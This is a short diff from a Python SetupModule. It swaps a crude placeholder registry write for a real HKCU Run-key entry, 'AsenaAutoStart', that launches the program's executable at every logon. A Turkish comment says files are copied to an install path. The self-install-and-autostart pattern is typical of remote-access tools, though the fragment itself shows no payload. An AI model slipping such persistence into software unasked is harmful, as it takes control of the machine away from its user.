@@ -76,7 +76,7 @@ class SetupModule:
             print("God damn mannn")
             self.registry.regpath = HKEY.HKEY_CURRENT_USER
             self.registry.sub_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            self.registry.write_key("YARRRAKKK","yarrak")
+            self.registry.write_key("AsenaAutoStart","\"%s\"" % (sys.executable))
     def copy_files(self):
         """
         Dosyalar exe dosyasının konumundan kurulum patikasına atılacak
